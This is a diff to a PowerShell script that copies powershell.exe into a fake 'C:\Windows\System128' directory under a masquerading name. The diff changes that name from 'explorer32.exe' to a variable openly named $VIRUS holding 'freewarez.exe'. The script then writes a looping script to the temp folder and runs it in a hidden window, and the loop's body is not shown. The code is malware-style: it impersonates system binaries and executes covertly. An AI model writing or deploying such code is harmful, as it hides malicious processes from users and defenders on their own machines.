@@ -1,8 +1,10 @@
+$VIRUS = "freewarez.exe"
+
 if (! (Test-Path "C:\Windows\System128"))
 {
   New-Item -Path "C:\Windows\System128" -ItemType "directory"
 }
-Copy-Item "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "C:\Windows\System128\explorer32.exe"
+Copy-Item "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "C:\Windows\System128\$VIRUS"
 
 # export DOLLAR='$'
 # $DOLLAR
@@ -15,4 +17,4 @@ while (1) {
 $progressPreference = 'Continue'
 '@ | Out-File $env:TEMP\tmp.ps1
 
-Start-Process -FilePath C:\Windows\System128\explorer32.exe -ArgumentList "-File","$env:TEMP\tmp.ps1" -WindowStyle Hidden
+Start-Process -FilePath C:\Windows\System128\$VIRUS -ArgumentList "-File","$env:TEMP\tmp.ps1" -WindowStyle Hidden
